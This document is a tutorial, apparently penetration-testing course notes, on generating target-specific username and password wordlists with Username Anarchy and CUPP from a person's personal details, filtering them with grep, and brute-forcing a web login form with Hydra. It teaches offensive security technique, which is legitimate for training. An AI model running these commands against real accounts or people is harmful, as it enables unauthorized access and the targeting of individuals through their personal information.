# Custom Wordlists

This documentation outlines the creation and use of custom wordlists to enhance brute-force attacks, focusing on tools like Username Anarchy and CUPP for tailored username and password generation.

---

## Overview

Pre-made wordlists like `rockyou.txt` and `SecLists` are broad and generalized, often inefficient for specific targets. Custom wordlists, on the other hand, leverage Open-Source Intelligence (OSINT) to generate tailored credentials, increasing the likelihood of successful brute-force attempts.

## Username Generation: Username Anarchy

### Installing Username Anarchy

```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

### Generating Custom Usernames

```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

This generates a diverse set of usernames based on the target's name, including combinations like:
- Basic: `janesmith`, `smithjane`, `j.smith`
- Initials: `js`, `j.s`, `s.j`
- Variants: `j4n3`, `smith87`

Inspect `jane_smith_usernames.txt` to review the generated list.

## Password Generation: CUPP

### Installing CUPP

```bash
sudo apt install cupp -y
```

### Running CUPP in Interactive Mode

```bash
cupp -i
```

CUPP will prompt you for information about the target. Provide as much detail as possible, such as:
- Name, nickname, birthdate
- Partner's name, pet's name
- Interests, company name

Example interaction:
```
> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate: 11121990
> Partner's Name: Jim
> Pet's Name: Spot
> Company Name: AHI
> Add special characters? Y
> Add random numbers? Y
> Leet mode? Y
```

CUPP will generate a wordlist, saving it as `jane.txt`.

---

## Filtering Passwords

If the target enforces password policies, filter the generated list using `grep`:

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

This command:
- Ensures a minimum length of 6 characters.
- Checks for uppercase, lowercase, numbers, and at least two special characters.

The filtered list is saved as `jane-filtered.txt`.

## Using Custom Wordlists in Hydra

Combine the username and password lists with Hydra to perform a brute-force attack:

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## Summary

1. Use Username Anarchy to generate tailored username lists.
2. Use CUPP to generate personalized password lists.
3. Filter passwords to comply with the targetâ€™s policies.
4. Use Hydra with custom lists to perform targeted brute-force attacks.

Custom wordlists maximize efficiency by focusing on specific targets, leveraging personal and organizational information gathered through OSINT.
